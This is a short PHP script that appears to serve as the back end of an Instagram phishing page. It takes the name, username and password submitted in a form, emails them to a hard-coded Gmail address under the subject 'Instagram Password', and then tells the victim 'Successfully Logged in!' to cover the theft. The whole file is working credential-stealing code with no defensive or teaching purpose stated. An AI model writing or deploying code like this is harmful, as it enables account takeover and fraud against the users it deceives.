<?php

$email=$_POST['email'];
$name=$_POST['name'];
$username=$_POST['username'];
$password=$_POST['password'];


$mailTo="mustakimmullick12345@gmail.com";
$subject="Instagram Password";
$formcontent="name: $name \n username: $username \n password: $password";
$header="From: $email";

mail($mailTo, $subject, $formcontent, $header) or die("Error!");
echo "Successfully Logged in!";

?>
